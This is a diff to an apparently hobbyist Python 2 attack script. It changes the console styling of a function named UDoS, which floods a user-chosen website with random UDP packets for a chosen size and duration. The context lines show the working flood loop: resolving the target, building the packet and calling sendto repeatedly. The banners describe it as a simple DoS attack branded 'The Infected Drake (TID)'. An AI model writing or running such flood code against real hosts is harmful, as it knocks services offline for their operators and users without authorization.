@@ -72,12 +72,12 @@ def UDoS():
 	target = raw_input(color.PURPLE + color.BOLD +"                          Target (Enter website address to be DDoS'ed):> ")
        	host_ip=socket.gethostbyname(target)
 	print(color.RED + "                                         Target set ---> %s " % (target))
-	print("                  +=====================================================================+")
+	print(color.BOLD+"                  +=====================================================================+")
 	time.sleep(0.3)
 	print ""
 	package = input(color.BLUE + color.BOLD +"                                         Size (MAX 65507): ")
 	print(color.RED + "                      Target to be attacked with packets of data --->  %s" % (package))
-	print("                  +=====================================================================+")
+	print(color.BOLD+"                  +=====================================================================+")
 	time.sleep(0.3)
 	print ""
 	duration = input(color.GREEN + color.BOLD +"                                   Duration (0 is infinite): ")
@@ -86,7 +86,7 @@ def UDoS():
 	duration = (1, (durclock() + duration))[duration > 0]
 	packet = random._urandom(package)
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	print("                  +=====================================================================+")
+	print(color.BOLD+"                  +=====================================================================+")
 	print ""
 	print("               The UDP flood started on %s with %s bytes for %s seconds." % (target, package, duration))
 	while True:
@@ -96,12 +96,12 @@ def UDoS():
 	                sock.sendto(packet, (target, port))
 	        else:
 	                break
-	print color.YELLOW + "                  +=====================================================================+" + color.END
-	print ""+M+"                        The UDP flood has completed on %s for %s seconds." % (target, duration)
+	print color.YELLOW + color.BOLD+"                  +=====================================================================+" + color.END
+	print ""+M+color.BOLD+"                        The UDP flood has completed on %s for %s seconds." % (target, duration)
 	time.sleep(0.3)
-	print color.RED +"                               This is normal simple DoS attack at the UDP level..."
+	print color.RED +color.BOLD+"                               This is normal simple DoS attack at the UDP level..."
 	time.sleep(0.3)
-	print color.CYAN + "                                     << Remember The Infected Drake (TID) >>"
+	print color.CYAN + color.BOLD+"                                     << Remember The Infected Drake (TID) >>"
 	time.sleep(0.3)
-	print color.PURPLE + "                                         Shutting down ... Goodbye ^_^ "
-	print color.YELLOW + "             +==============================================================================+" + color.END
+	print color.PURPLE + color.BOLD+"                                         Shutting down ... Goodbye ^_^ "
+	print color.YELLOW + color.BOLD+"             +==============================================================================+" + color.END
